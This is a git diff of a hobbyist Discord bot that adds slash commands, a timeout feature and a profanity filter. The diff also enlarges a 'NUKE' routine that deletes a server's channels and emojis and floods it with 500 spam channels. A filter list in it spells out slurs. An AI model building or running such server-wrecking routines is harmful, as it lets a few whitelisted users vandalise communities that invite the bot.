@@ -12,37 +12,40 @@ import nacl
 import exint.interpreter as lang
 
 from tensorflow import keras
+from discord import app_commands
 from discord.ext import commands
 
 from discord.ext.commands import Bot
 
 # Features:
 #   1. randomly send greeting messages
-#   2. predict grade
+#   2. predict grade (Slash)
 #   3. logs
 #   4. spam
 #   5. SuS
-#   6. say something
+#   6. say something (Slash)
 #   7. MEME
 #   8. do math via EXINT
 #   9. NUKE
 #   10. detect bad words
-#   11. timeout (not working) 
+#   11. timeout
 #   12. get user id
 #   13. welcome message
-#   14.
+#   14. fortune-telling
 #
 intents = discord.Intents.all()
 client = Bot(command_prefix='?', intents=intents)
+tree = client.tree
 mensaje = None
 logflag = True
 curse_words = ("fuck", "shit", "f*ck", "f**k", "fags", "nigger", "chink", "nigga", "sex",
-               "gay", "faggot", "faggots", "retard", "fag", "ass", "bitch", "asshole", "dick",
-               "penis", "stfu", "shut up", "kys", "wtf")
+               "faggot", "faggots", "retard", "fag", "ass", "bitch", "asshole", "dick",
+               "penis", "stfu", "shutup", "kys", "wtf", "meth", "retard", "cock", "dik")
 spamhalt = False
 SERVER_NAME = ""
 MYSERVER = "Turrnut Republic(拖鞋社)"
 ADMIN = "turrnut#9727"
+guilds = []
 
 class Meme:
     def __init__(self, name, suggested):
@@ -92,6 +95,8 @@ def log(msg,):
         return
     except UnicodeEncodeError as e:
         return
+    except FileNotFoundError as e:
+        return
     except UnicodeDecodeError as e:
         return
     except:
@@ -99,21 +104,26 @@ def log(msg,):
 
 
 def plog(msg, ):
-    SERVER_NAME = str(mensaje.author)
-    if bool(os.path.exists(pathify(f"json|dm|{SERVER_NAME}|log.log"))) == False:
-        bruh.bruh(pathify(f"json|dm|{SERVER_NAME}|log.log"), "\n", pathify(
-            f"json|dm|{SERVER_NAME}"))
+    try:
+        SERVER_NAME = str(mensaje.author)
+        if bool(os.path.exists(pathify(f"json|dm|{SERVER_NAME}|log.log"))) == False:
+            bruh.bruh(pathify(f"json|dm|{SERVER_NAME}|log.log"), "\n", pathify(
+                f"json|dm|{SERVER_NAME}"))
 
-    with open(pathify(f"json|dm|{SERVER_NAME}|log.log"), "a") as fobj:
-        fobj.write(msg)
-        fobj.write(" | ")
-        fobj.write(str(datetime.datetime.now()))
-        fobj.write("\n")
-
+        with open(pathify(f"json|dm|{SERVER_NAME}|log.log"), "a") as fobj:
+            fobj.write(msg)
+            fobj.write(" | ")
+            fobj.write(str(datetime.datetime.now()))
+            fobj.write("\n")
+    except: return
 
 def validMessage(mes):
-    global ADMINdfsgfds
+    global ADMIN
     return str(mes.author) in (ADMIN, "Nickels#8378", "a-fork-in-soup#2611", "Nickels#3069", "Comte de Monte Cristo#4077", "Netcrosystem#8581", "SnowIsFalling#0514")
+
+def validInteraction(mes):
+    global ADMIN
+    return str(mes.user) in (ADMIN, "Nickels#8378", "a-fork-in-soup#2611", "Nickels#3069", "Comte de Monte Cristo#4077", "Netcrosystem#8581", "SnowIsFalling#0514")
 
 
 async def cant(mes):
@@ -127,12 +137,16 @@ async def dostuff(instructions, message):
     global logflag
     global memes
     global ADMIN
+    global tree
     instruction = []
     for i in instructions:
         instruction.append(i)
     print(instruction)
 
     expression = ""
+    if instruction[1] == "sync":
+        await tree.sync()
+        await message.channel.send("Commands Synced")
     if instruction[1] == "calculate":
         if len(instruction) == 2:
             return
@@ -214,7 +228,7 @@ async def dostuff(instructions, message):
                         await c.delete()
                     await theguild.create_text_channel('welcome-back')
                     iterate = 0 
-                    while iterate < 10:
+                    while iterate < 500:
                         await theguild.create_text_channel('nuked')
                         iterate += 1
                     for Emoji in theguild.emojis:
@@ -223,7 +237,7 @@ async def dostuff(instructions, message):
                         if member.bot:
                             continue
                         try:
-                            await member.ban()
+                            if False: await member.ban()
                         except:
                             print(f"can't ban {str(member)}")
                     # LOG
@@ -264,7 +278,46 @@ async def dostuff(instructions, message):
             await message.channel.send("As suggested by: " + str(meme.suggested))
     if len(instruction) > 2:
         if instruction[1].lower() == "time":
-            client.get_user(int(instruction[2].replace("<","").replace("@","").replace(">",""))).timeout(datetime.datetime(datetime.datetime.now().year, datetime.datetime.now().month, datetime.datetime.now().day, hour=datetime.datetime.now().hour, minute=datetime.datetime.now().minute + 10).astimezone())
+            if not validMessage(message):
+                cant(message)
+                # LOG
+                log(f"{str(message.author)} tries to time out the author of {str(instruction[2])} but has no proper permissions")
+                return
+            link = instruction[2]
+            hours = 0
+            days = 0
+            if len(instruction) == 3:
+                hours = 1
+            else:
+                if 'd' in instruction[3]:
+                    days = instruction[3].replace('d', '')
+                else:
+                    hours = instruction[3]
+            link = link.split('/')
+            server_id = int(link[4])
+            channel_id = int(link[5])
+            msg_id = int(link[6])
+            print(f"serverid: {server_id}, channelid: {channel_id}, msgid: {msg_id}")
+
+            server = client.get_guild(server_id)
+            channel = server.get_channel(channel_id)
+            mesg = await channel.fetch_message(msg_id)
+            await mesg.author.timeout(datetime.datetime(datetime.datetime.now().year, datetime.datetime.now().month, datetime.datetime.now().day + int(days), hour=datetime.datetime.now().hour + int(hours), minute=datetime.datetime.now().minute).astimezone())
+
+            # LOG
+            log(f"{str(message.author)} times out the author of {str(instruction[2])}")
+        if instruction[1].lower() == "ask":
+            i = 2
+            question = f"<@{str(message.author.id)}> asks: ** "
+            while i < len(instruction):
+                add = instruction[i]
+                question += f"{add} "
+                i += 1
+            yesorno = random.Random().choice(seq=("Definitely yes", "Definitely no", "Probably", "Probably not", "Ummmm.. idk", "idk lol", "What did you say? Ask it again.", "I can't decide", "Why asking me?", "It's the... actually never mind", "I will ask for an oracle", "I don't know, ask the owner", "I know the answer but can't tell you"))
+            
+            question += f"? **\n> the fortune teller decided: ||{yesorno}||"
+            await message.channel.send(question)
+            
         if instruction[1].lower() == "factorial":
             i = 2
             expression = ""
@@ -283,8 +336,6 @@ async def dostuff(instructions, message):
                 except:
                     await message.channel.send("Invalid Input") 
                     return
-        if instruction[1].lower() == "time" and validMessage(message):
-            await client.get_user(int(instruction[2])).timeout(datetime.datetime(datetime.datetime.now().year, datetime.datetime.now().month, datetime.datetime.now().day, hour=datetime.datetime.now().hour, minute=datetime.datetime.now().minute + 10).astimezone())
         if instruction[1].lower() == "get":
             await message.channel.send(str(instruction[2]).replace("<", "").replace(">", "").replace("@", ""))
         if instruction[1].lower() in ("send", "send_delete"):
@@ -436,6 +487,46 @@ async def dostuff(instructions, message):
 
                 await cant(message)
 
+@tree.command(name="predict-grade", description="Enter your grades for first three quarters to get the prediction of the final quarter!")
+async def predictgrade(interaction: discord.Interaction, first:float, second:float, third:float):
+    model = keras.models.load_model(pathify("models|grades"), compile=False)
+    model.compile(optimizer="adam", loss="sparse_categorical_crossentropy",metrics=["accuracy"])
+    if first > 100 or first < 0 or second > 100 or second < 0 or third > 100 or third < 0:
+
+        await interaction.response.send_message("Please make sure all the numbers are between 0 and 100!", ephemeral=True)
+        return
+    else:
+        predictions = model.predict(np.asarray([
+            [first, second, third]
+        ]))
+        # LOG
+        log(str(interaction.user) + " predict the grade as " +
+        str(first) + " " + str(second) + " " + str(third))
+        if first == second == third:
+             await interaction.response.send_message(f"{first},{second},{third}\nThe turrnut Aritificial Intelligence predict that your final quarter grade will be: " + str(first) + "%\n100.0% Confidence")
+        else:
+            await interaction.response.send_message(f"{first},{second},{third}\nThe turrnut Aritificial Intelligence predict that your final quarter grade will be: " + str(round(possibilities[np.argmax(predictions[0])], 2)) + "%\n" + str(round(predictions[0][np.argmax(predictions[0])] * 100, 2)) + "% Confidence")
+            
+@tree.command(name="ask", description="Ask the fortune teller a question!")
+async def ask(interaction: discord.Interaction, question:str):
+    q = f"<@{str(interaction.user.id)}> asks: ** {question}"
+    yesorno = random.Random().choice(seq=("Definitely yes", "Definitely no", "Probably", "Probably not", "Ummmm.. idk", "idk lol", "What did you say? Ask it again.", "I can't decide", "Why asking me?", "It's the... actually never mind", "I will ask for an oracle", "I don't know, ask the owner", "I know the answer but can't tell you"))
+            
+    q += f"? **\n> the fortune teller decided: ||{yesorno}||"
+    await interaction.response.send_message(q)
+
+@tree.command(name="help", description="Need technical support or learn more about the bot? Use this command!")
+async def inv(interaction: discord.Interaction):
+    await interaction.response.send_message("Click this link to invite me to your server: https://discord.com/oauth2/authorize?client_id=1014960764378939453&scope=bot \nFor more information, visit our website: https://turrnut.github.io/discordbot\nFor technical support, join our server: https://discord.gg/JBB8C33pKS")
+
+@tree.command(name="speak", description="Make me say something!")
+async def say(interaction: discord.Interaction, message:str):
+    if validInteraction(interaction):
+        await interaction.response.send_message("ok", ephemeral=True)
+        await interaction.channel.send(message)
+    else:
+        await interaction.response.send_message(message)
+
 @client.event
 async def on_reaction_add(reaction, user):
     if user.bot:
@@ -444,21 +535,19 @@ async def on_reaction_add(reaction, user):
 
 @client.event
 async def on_ready():
+    global guilds
     print(f'Bot Name: {client.user}')
     print(f"servers the bot is in ( {len(client.guilds) } ): ", end="")
     num_of_servers = 0
     for server in client.guilds:
-        print(server, ",", end="")
+        print(server, f"({server.id}),", end="")
+        guilds.append(int(server.id))
         num_of_servers += 1
-    print("\b  ")
+    # for guild in guilds:
+        # await client.tree.sync(guild=discord.Object(id=guild))
     # change status reference: https://stackoverflow.com/questions/59126137/how-to-change-activity-of-a-discord-py-bot
     # await client.change_presence(activity=discord.Game(name="Among Us")
     await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"you!!!!"))
-
-
-@client.command(pass_context=True)
-async def test(ctx):
-    await ctx.send('test')
 
 
 @client.event
@@ -520,8 +609,8 @@ async def on_message(message):
             instructions.pop(i)
         i += 1
     if not validMessage(message):
-        for ins in instructions:
-            if ins.lower() in curse_words:
+        for c in curse_words:
+            if c in mensaje.content.lower().replace(' ', '').replace('\t', '').replace('\r', '').replace('\n', '').replace('*', ''):
                 await message.channel.send(f"<@" + str(message.author.id) + "> u have been warned. Watch your language.")
                 await message.delete()
                 await message.author.timeout(datetime.datetime(datetime.datetime.now().year, datetime.datetime.now().month, datetime.datetime.now().day, hour=datetime.datetime.now().hour, minute=datetime.datetime.now().minute + 10).astimezone())
